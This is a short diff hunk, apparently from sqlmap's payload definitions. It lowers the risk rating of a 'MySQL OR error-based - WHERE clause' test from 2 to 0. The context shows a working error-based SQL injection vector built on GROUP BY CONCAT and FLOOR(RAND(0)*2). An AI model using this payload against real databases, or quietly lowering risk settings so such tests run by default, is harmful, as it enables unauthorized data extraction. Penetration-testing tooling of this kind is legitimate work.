@@ -912,7 +912,7 @@ Formats:
         <title>MySQL OR error-based - WHERE clause</title>
         <stype>2</stype>
         <level>2</level>
-        <risk>2</risk>
+        <risk>0</risk>
         <clause>1</clause>
         <where>2</where>
         <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
